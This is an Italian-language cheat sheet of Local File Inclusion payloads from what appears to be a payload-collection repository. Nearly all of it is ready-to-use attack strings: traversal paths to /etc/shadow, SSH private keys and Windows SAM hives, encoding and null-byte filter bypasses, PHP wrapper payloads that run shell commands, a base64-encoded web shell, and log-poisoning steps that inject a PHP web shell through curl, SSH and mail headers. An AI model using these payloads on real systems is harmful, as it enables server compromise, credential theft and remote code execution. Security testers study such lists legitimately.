# 📂 Raccolta di payload LFI

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](LFI.tr.md) • [🇬🇷 Ελληνικά](LFI.el.md)

> **Nota sugli esempi originali:** L’inclusione di file non implica automaticamente esecuzione di codice. I wrapper dipendono da estensioni/configurazione PHP e dal tipo di operazione. I bypass con byte nullo sono riferimenti storici; accessibilità e contenuto dei log o di /proc/self/environ non sono garantiti. I percorsi e i payload originali sono conservati.


```
  ██╗     ███████╗██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██║     ██╔════╝██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ██║     █████╗  ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ██║     ██╔══╝  ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████╗██║     ██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝╚═╝     ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

---

## 🐧 File Linux

### Attraversamento di base delle directory
```
/etc/passwd
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
```

### Con codifica URL
```
..%2F..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Tecniche di aggiramento
```
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/....\/etc/passwd
..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8fetc/passwd
/etc/passwd%00
/etc/passwd%00.jpg
/etc/passwd%00.php
```

### File Linux di interesse
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/group
/etc/resolv.conf
/etc/crontab
/etc/ssh/sshd_config
/etc/ssh/ssh_config
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/auth.log
/var/log/syslog
/home/user/.ssh/id_rsa
/home/user/.bash_history
/root/.bash_history
/root/.ssh/id_rsa
```

---

## 🪟 File Windows

### Attraversamento di base delle directory
```
C:\Windows\System32\drivers\etc\hosts
C:/Windows/System32/drivers/etc/hosts
..\..\..\..\Windows\System32\drivers\etc\hosts
....\\....\\....\\Windows\\System32\\drivers\\etc\\hosts
```

### File Windows di interesse
```
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
C:\Windows\repair\SAM
C:\Windows\repair\SYSTEM
C:\Windows\win.ini
C:\Windows\system.ini
C:\boot.ini
C:\inetpub\logs\LogFiles
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\xampp\php\php.ini
C:\Program Files\FileZilla Server\FileZilla Server.xml
```

---

## 🔄 Wrapper (PHP)

### php://filter (lettura del sorgente)
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/read=convert.base64-encode/resource=../config.php
```

### php://input (esecuzione di codice remoto)
```
php://input
POST: <?php system('id'); ?>
```

### Wrapper data://
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
data://text/plain,<?php system($_GET['cmd']); ?>
```

### expect:// (esecuzione di codice remoto)
```
expect://id
expect://whoami
```

### Wrapper zip://
```
zip://path/to/file.zip%23shell.php
```

### Wrapper phar://
```
phar://uploads/shell.jpg/test.php
```

---

## 🔥 Avvelenamento dei log (RCE)

### Log degli accessi di Apache
```bash
# 1. Inserisci codice PHP tramite User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 2. Includi il file di log
?page=/var/log/apache2/access.log&cmd=id
```

### Log SSH
```bash
# 1. Inserisci il contenuto tramite SSH
ssh '<?php system($_GET["cmd"]);?>'@target.com

# 2. Includi il log
?page=/var/log/auth.log&cmd=id
```

### Log della posta
```bash
# 1. Invia un'email con contenuto malevolo
mail -s "<?php system(\$_GET['cmd']); ?>" target@localhost

# 2. Includi il log
?page=/var/log/mail.log&cmd=id
```

### Ambiente del processo (proc environ)
```
?page=/proc/self/environ
# User-Agent: <?php system('id'); ?>
```

---

## 📊 Riferimento rapido

### Rilevamento
```
?page=../../../etc/passwd
?file=....//....//etc/passwd
?path=/etc/passwd%00
```

### Aggiramento dei filtri
| Filtro | Aggiramento |
|--------|--------|
| `../` bloccato | `....//`, `..././` |
| `.php` richiesto | `%00`, byte nullo |
| Lista degli elementi consentiti | Wrapper php:// |

### Parametri comuni
```
page, file, path, include, doc
document, folder, root, pg, style
template, view, content, load
```

---

## 📚 Risorse

- [PayloadsAllTheThings LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HackTricks LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

---

<p align="center">
  <b>📂 Raccolta di payload LFI</b><br>
  <i>Solo per scopi didattici!</i>
</p>
